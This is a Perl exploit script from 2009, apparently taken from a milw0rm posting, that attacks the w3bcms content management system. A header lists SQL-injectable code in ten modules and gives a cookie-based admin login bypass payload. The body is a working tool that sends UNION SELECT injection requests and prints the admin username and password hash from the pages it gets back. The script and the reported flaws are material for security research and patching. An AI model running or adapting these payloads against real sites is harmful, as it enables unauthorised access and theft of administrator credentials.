@@ -1,0 +1,412 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Request::Common qw(POST);
+use Getopt::Long;
+
+#                            \#'#/
+#                            (-.-)
+#    -------------------oOO---(_)---OOo------------------
+#    |           __             __                      |
+#    |     _____/ /_____ ______/ /_  __  ______ ______  |
+#    |    / ___/ __/ __ `/ ___/ __ \/ / / / __ `/ ___/  |
+#    |   (__  ) /_/ /_/ / /  / /_/ / /_/ / /_/ (__  )   |
+#    |  /____/\__/\__,_/_/  /_.___/\__,_/\__, /____/    |
+#    |  Security Research Division      /____/ 2oo9     |
+#    ----------------------------------------------------
+#    | w3bcms <= v3.5.0 Multiple Remote Vulnerabilities |
+#    |        (requires magic_quotes_gpc = Off)         |
+#    ----------------------------------------------------
+# [!] Discovered.: DNX
+# [!] Vendor.....: http://www.w3bcms.de
+# [!] Detected...: 11.01.2009
+# [!] Reported...: 17.01.2009
+# [!] Response...: 19.01.2009
+#
+# [!] Background.: CMS features in the frontend:
+#                  » Ausgabe angelegter Seiten
+#                  » Integrierter sicherer Spamschutz (kein Captcha!)
+#                  » CMS Features wie Slogan Rotation, Datumausgabe, Seitenanzeige
+#                  » Integrierter Besuchercounter (versteckt/sichtbar)
+#               <b>» Sicherheit gegen Hackangriffe</b>
+#                  » Schnelle Datenbankabfragen
+#                  » 100% Suchmaschinenoptimiert (SEO)
+#                  » Erweiterbar durch Module & Addons
+#                  » Unterstützt Mod Rewrite URL's (optional)
+#
+#
+# [!] Info.......: Insecure Cookie Handling in Admin Backend Login
+# [!] Bug........: $_COOKIE["cms_admin"] in admin/index.php near line 67
+#
+#                  67: if ($_COOKIE["cms_admin"] != "") {
+#                  68: 
+#                  69:         $admin = mysql_fetch_assoc(mysql_query("SELECT * FROM admin WHERE cookie='".$_COOKIE["cms_admin"]."'"));
+#                  70: 
+#                  71:         if ($admin['benutzername'] != "") {
+#                  72: 
+#                  73:                 $_SESSION['login'] = true;
+#                  74:                 header("Location: inc/index.php?seite=uebersicht");
+#                  75:                 exit;
+#                  76: 
+#                  77:         }
+#                  78: 
+#                  79: }
+#
+# [!] PoC........: javascript:document.cookie = "cms_admin=' or '1'='1; path=/";
+#
+#
+# [!] Info.......: Downloads module v1.5.0
+# [!] Bug........: $_GET['id'] in includes/module/downloads/index.inc.php near line 15
+#
+#                  15: if (isset($_GET['action']) && $_GET['action'] == "klick") {
+#                  16: 
+#                  17:         $data = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_downloads WHERE id='".$_GET['id']."'"));
+#                  18:         mysql_query("UPDATE modul_downloads SET klicks=klicks+1 WHERE id='".$_GET['id']."'");
+#                  19:         $url = preg_replace('(%PAGE_DIR%)', $settings['page_dir'], $data['url']);
+#                  20:         header("Location: ".$url."");
+#                  21:         exit;
+#                  22: 
+#                  23: }
+#
+#
+# [!] Info.......: News module v1.5.0
+# [!] Bug........: $_GET['action'] in includes/module/news/index.inc.php near line 131
+#
+#                  131: $kcheck = eregi ("kommentar", $_GET['action']);
+#
+#                  135: if ($kcheck == "1") {
+#                  136: 
+#                  137:         $str = $_GET['action'];
+#                  138:         $explode = explode(".",$str);
+#                  139: 
+#                  140:         $ausgabe = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_news WHERE id='".$explode[0]."' AND status='0'"));
+#
+#
+# [!] Info.......: Portfolio module v2.0.0
+# [!] Bug........: $_GET['action'] in includes/module/portfolio/index.inc.php near line 75
+#
+#                  75: $kcheck = eregi ("show", $_GET['action']);
+#                  76: 
+#                  77: if ($kcheck == "1") {
+#                  78: 
+#                  79:         $str = $_GET['action'];
+#                  80:         $explode = explode(".",$str);
+#                  81: 
+#                  82:         $ausgabe = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_portfolio WHERE id='".$explode[0]."'"));
+#
+#
+# [!] Info.......: Partner module v1.5.0
+# [!] Bug........: $_GET['id'] in includes/module/partner/index.inc.php near line 15
+#
+#                  15: if (isset($_GET['action']) && $_GET['action'] == "klick") {
+#                  16: 
+#                  17:         $data = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_partner WHERE id='".$_GET['id']."'"));
+#                  18:         mysql_query("UPDATE modul_partner SET klicks=klicks+1 WHERE id='".$_GET['id']."'");
+#                  19: 
+#                  20:         header("Location: ".$data['url']."");
+#                  21:         exit;
+#                  22: 
+#                  23: }
+#
+#
+# [!] Info.......: Mediathek module v1.5.0
+# [!] Bug........: $_GET['id'] in includes/module/mediathek/index.inc.php near line 15
+#
+#                  15: if (isset($_GET['action']) && $_GET['action'] == "klick") {
+#                  16: 
+#                  17:         $data = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_mediathek WHERE id='".$_GET['id']."'"));
+#                  18:         mysql_query("UPDATE modul_mediathek SET klicks=klicks+1 WHERE id='".$_GET['id']."'");
+#                  19: 
+#                  20:         $mediafile = $settings['page_dir']."/includes/media/".$data['mediafile'];
+#                  21:
+#                  22:         header("Location: ".$mediafile."");
+#                  23:         exit;
+#                  24:
+#                  25: }
+#
+#
+# [!] Info.......: Sitemap module v1.5.0
+# [!] Bug........: $_GET['seite'] in includes/module/sitemap/index.inc.php near line 15
+#
+#                  15: $explode = explode(".",$_GET['seite']);
+#
+#                  19: $menu = mysql_query("SELECT * FROM pages WHERE submenu='0' AND aktiv='0' AND hidden='0' AND id!='".$explode['0']."' ORDER by sortierung");
+#
+#
+# [!] Info.......: Links module v1.5.0
+# [!] Bug........: $_GET['id'] in includes/module/links/index.inc.php near line 15
+#
+#                  15: if (isset($_GET['action']) && $_GET['action'] == "klick") {
+#                  16: 
+#                  17:         $data = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_links WHERE id='".$_GET['id']."'"));
+#                  18:         mysql_query("UPDATE modul_links SET klicks=klicks+1 WHERE id='".$_GET['id']."'");
+#                  19:         header("Location: ".$data['url']."");
+#                  20:         exit;
+#                  21: 
+#                  22: }
+#
+#
+# [!] Info.......: Blog module v1.5.0
+# [!] Bug........: $_GET['action'] in includes/module/blog/index.inc.php near line 133
+#
+#                  131: $kcheck = eregi ("kommentar", $_GET['action']);
+#
+#                  135: if ($kcheck == "1") {
+#                  136: 
+#                  137:         $str = $_GET['action'];
+#                  138:         $explode = explode(".",$str);
+#                  139: 
+#                  140:         $ausgabe = mysql_fetch_assoc(mysql_query("SELECT * FROM modul_blog WHERE id='".$explode[0]."' AND status='0'"));
+#
+#
+# [!] Info.......: Suche module v1.5.0
+# [!] Bug........: $_POST['suchbegriff'] in includes/module/suche/index.inc.php near line 66
+#
+#                  66: $eingabe = trim(strip_tags($_POST['suchbegriff']));
+#                  67: $eingabe_array = explode(" ", $eingabe);
+#                  68: $eingabe_array = array_unique($eingabe_array);
+#                  69: 
+#                  70: if ($eingabe == "" || $_POST['suchbegriff'] == "Suchbegriff(e) ..."){
+#                  71: 
+#                  72:         echo "<p>Fehler - Bitte <b>mindestens ein Suchbegriff</b> eingegeben!</p>";
+#                  73: 
+#                  74: } else {
+#                  
+#                  78:         $query_pages = "SELECT id, titel, inhalt, page FROM pages WHERE ";
+#                  79: 
+#                  80:         for ($i=0; $i<count($eingabe_array); $i++) {
+#                  81: 
+#                  82:                 $query_pages .= "((titel LIKE '%" . $eingabe_array[$i] . "%') OR (inhalt LIKE '%" . $eingabe_array[$i] . "%'))";
+#                  83: 
+#                  84:                 if ($i<count($eingabe_array)-1){
+#                  85: 
+#                  86:                         $query_pages .= " AND ";
+#                  87: 
+#                  88:                 }
+#                  89: 
+#                  90:                 $query_pages .= "AND type!='modul' AND type!='extern' AND inhalt!='' AND aktiv='0'";
+#                  91: 
+#                  92:         }
+#                  93: 
+#                  94:         $num_rows_pages = @mysql_num_rows(mysql_query($query_pages));
+#                  95:         $result_pages = @mysql_query($query_pages);
+#
+#
+# [!] Info.......: Gallery module v1.5.0
+# [!] Bug........: $_GET['action'] in includes/module/gallery/index.inc.php near line 314
+#
+#                  314: } else if ($locate == "1" && isset($_GET['action']) && isset($_GET['id']) && $_GET['id'] != "") {
+#                  
+#                  320:         $explode = explode(".",$_GET['action']);
+#                  
+#                  324:         $album = mysql_query("SELECT * FROM modul_gallery WHERE album_id='".$explode[0]."' ORDER by id ".$sqlorder." LIMIT $zeige,$trefferproseite");
+#
+#
+# [!] Solution...: Upgrade to v3.5.1 or higher and update all modules
+#
+
+if(!$ARGV[2])
+{
+  print "\n                          \\#'#/                       ";
+  print "\n                          (-.-)                        ";
+  print "\n   ------------------oOO---(_)---OOo-------------------";
+  print "\n   | w3bcms <= v3.5.0 Multiple Remote Vulnerabilities |";
+  print "\n   |                  coded by DNX                    |";
+  print "\n   ----------------------------------------------------";
+  print "\n[!] Usage: perl w3blabor.pl [Target] <Options>";
+  print "\n[!] Example: perl w3blabor.pl -1 -u \"http://127.0.0.1/w3b/index.php?seite=2.down&action=klick&id=1\"";
+  print "\n[!] Targets:";
+  print "\n       -1              Exploit over Downloads module v1.5.0";
+  print "\n       -2              Exploit over News module v1.5.0";
+  print "\n       -3              Exploit over Portfolio module v2.0.0";
+  print "\n       -4              Exploit over Partner module v1.5.0";
+  print "\n       -5              Exploit over Mediathek module v1.5.0";
+  print "\n       -6              Exploit over Sitemap module v1.5.0";
+  print "\n       -7              Exploit over Links module v1.5.0";
+  print "\n       -8              Exploit over Blog module v1.5.0";
+  print "\n       -9              Exploit over Suche module v1.5.0";
+  print "\n       -10             Exploit over Gallery module v1.5.0";
+  print "\n[!] Options:";
+  print "\n       -u [url]        URL to vuln website";
+  print "\n       -p [ip:port]    Proxy support";
+  print "\n";
+  exit;
+}
+
+my $ua       = LWP::UserAgent->new();
+my $response = "";
+my %options  = ();
+GetOptions(\%options, "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "u=s", "p=s");
+
+if($options{"p"}) { $ua->proxy('http', "http://".$options{"p"}); }
+
+if($options{"1"}) { use_download_bug(); }
+elsif($options{"2"}) { use_news_bug(); }
+elsif($options{"3"}) { use_portfolio_bug(); }
+elsif($options{"4"}) { use_partner_bug(); }
+elsif($options{"5"}) { use_mediathek_bug(); }
+elsif($options{"6"}) { use_sitemap_bug(); }
+elsif($options{"7"}) { use_links_bug(); }
+elsif($options{"8"}) { use_blog_bug(); }
+elsif($options{"9"}) { use_suche_bug(); }
+elsif($options{"10"}) { use_gallery_bug(); }
+
+sub use_download_bug
+{
+  my $url_user = $options{"u"};
+  my $url_pass = $options{"u"};
+  my $exploit_user = "id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*";
+  my $exploit_pass = "id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*";
+  
+  $url_user =~ s/id=\d+/$exploit_user/i;
+  $response = $ua->get($url_user);
+  $response->base =~ /.*\/(.*?)$/;
+  my $user = $1;
+  
+  $url_pass =~ s/id=\d+/$exploit_pass/i;
+  $response = $ua->get($url_pass);
+  $response->base =~ /.*\/(.*?)$/;
+  my $pass = $1;  
+  
+  print $user.":".$pass;
+}
+
+sub use_news_bug
+{
+  my $url = $options{"u"};
+  my $exploit = "action='%20union%20select%201,2,3,4,benutzername,6,passwort%20from%20admin%20limit%201/*";
+  $url =~ s/action=\d+/$exploit/i;
+  $response = $ua->get($url);
+  if($response->content =~ /<p class="titel">(.*?)<\/p>.*([a-fA-F0-9]{32})<\/div>/s)
+  {
+    print $1.":".$2;
+  }
+}
+
+sub use_portfolio_bug
+{
+  my $url = $options{"u"};
+  my $exploit = "action='%20union%20select%201,2,passwort,benutzername,5,6,7,8,9,10,11,12,13,14,15,16%20from%20admin%20limit 1/*";
+  $url =~ s/action=\d+/$exploit/i;
+  $response = $ua->get($url);
+  if($response->content =~ /<h1>([a-fA-F0-9]{32})<\/h1>.*?<p align="justify">(.*?)<\/p>/s)
+  {
+    print $2.":".$1;
+  }
+}
+
+sub use_partner_bug
+{
+  my $url_user = $options{"u"};
+  my $url_pass = $options{"u"};
+  my $exploit_user = "id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*";
+  my $exploit_pass = "id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*";
+  
+  $url_user =~ s/id=\d+/$exploit_user/i;
+  $response = $ua->get($url_user);
+  $response->base =~ /.*\/(.*?)$/;
+  my $user = $1;
+  
+  $url_pass =~ s/id=\d+/$exploit_pass/i;
+  $response = $ua->get($url_pass);
+  $response->base =~ /.*\/(.*?)$/;
+  my $pass = $1;  
+  
+  print $user.":".$pass;
+}
+
+sub use_mediathek_bug
+{
+  my $url_user = $options{"u"};
+  my $url_pass = $options{"u"};
+  my $exploit_user = "id='%20union%20select 1,2,benutzername,4%20from%20admin%20limit%201/*";
+  my $exploit_pass = "id='%20union%20select 1,2,passwort,4%20from%20admin%20limit%201/*";
+  
+  $url_user =~ s/id=\d+/$exploit_user/i;
+  $response = $ua->get($url_user);
+  $response->base =~ /.*\/(.*?)$/;
+  my $user = $1;
+  
+  $url_pass =~ s/id=\d+/$exploit_pass/i;
+  $response = $ua->get($url_pass);
+  $response->base =~ /.*\/(.*?)$/;
+  my $pass = $1;  
+  
+  print $user.":".$pass;
+}
+
+sub use_sitemap_bug
+{
+  my $url = $options{"u"};
+  $url =~ /seite=(\d+)\./;
+  my $id = $1;
+  my $exploit = "seite=".$id."'%20union%20select%201,benutzername,passwort,4,5,6,7,8,9,10,11,12,13,14,15%20from%20admin%20/*";
+  $url =~ s/seite=\d+/$exploit/i;
+  $response = $ua->get($url);
+  if($response->content =~ /<strong>$id\.<\/strong>.*?<a href="index\.php\?seite=1\.(.*?)" title="(.*?)"/s)
+  {
+    print $1.":".$2;
+  }
+}
+
+sub use_links_bug
+{
+  my $url_user = $options{"u"};
+  my $url_pass = $options{"u"};
+  my $exploit_user = "id='%20union%20select 1,2,benutzername,4,5%20from%20admin%20limit%201/*";
+  my $exploit_pass = "id='%20union%20select 1,2,passwort,4,5%20from%20admin%20limit%201/*";
+  
+  $url_user =~ s/id=\d+/$exploit_user/i;
+  $response = $ua->get($url_user);
+  $response->base =~ /.*\/(.*?)$/;
+  my $user = $1;
+  
+  $url_pass =~ s/id=\d+/$exploit_pass/i;
+  $response = $ua->get($url_pass);
+  $response->base =~ /.*\/(.*?)$/;
+  my $pass = $1;  
+  
+  print $user.":".$pass;
+}
+
+sub use_blog_bug
+{
+  my $url = $options{"u"};
+  my $exploit = "action='%20union%20select%201,2,3,4,benutzername,6,passwort%20from%20admin%20limit%201/*";
+  $url =~ s/action=\d+/$exploit/i;
+  $response = $ua->get($url);
+  if($response->content =~ /<p class="titel">(.*?)<\/p>.*([a-fA-F0-9]{32})<\/div>/s)
+  {
+    print $1.":".$2;
+  }
+}
+
+sub use_suche_bug
+{
+  my $url = $options{"u"}."&action=senden";
+  my $search = "###___###%'))/**/union/**/select/**/1,benutzername,passwort,4/**/from/**/admin/*";
+  my $req = POST $url, [suchbegriff => $search];
+  my $response = $ua->request($req);
+  
+  if($response->content =~ /.*">(.*?)<\/a><br \/>([a-fA-F0-9]{32}) \[/s)
+  {
+    print $1.":".$2;
+  }
+}
+
+sub use_gallery_bug
+{
+  my $url = $options{"u"};
+  my $exploit = "action='%20union%20select%201,2,passwort,4,benutzername,6%20from%20admin/*";
+  $url =~ s/action=\d+/$exploit/i;
+  $response = $ua->get($url);
+  my @content = split(/\n/, $response->content);
+  foreach (@content)
+  {
+    if($_ =~ /\/([a-fA-F0-9]{32})" rel="lytebox\[.*?\]" title="(.*?)"/)
+    {
+      print $2.":".$1."\n";
+    }
+  }
+}
+
+# milw0rm.com [2009-02-09]
